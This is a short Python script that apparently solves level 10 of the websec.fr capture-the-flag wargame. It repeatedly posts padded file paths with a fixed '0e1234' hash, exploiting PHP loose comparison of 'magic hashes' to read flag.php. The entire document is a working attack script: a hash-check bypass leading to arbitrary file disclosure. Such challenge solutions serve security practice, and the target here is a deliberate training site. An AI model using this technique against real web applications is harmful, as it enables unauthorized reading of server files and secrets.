import requests

URL = 'https://websec.fr/level10/index.php'

for i in range(1000):
    print(i)
    r = requests.post(URL, data={'f': './' +'/'*i + 'flag.php', 'hash': '0e1234'})
    if 'WEBSEC{' in r.text:
        print(r.text)
        break
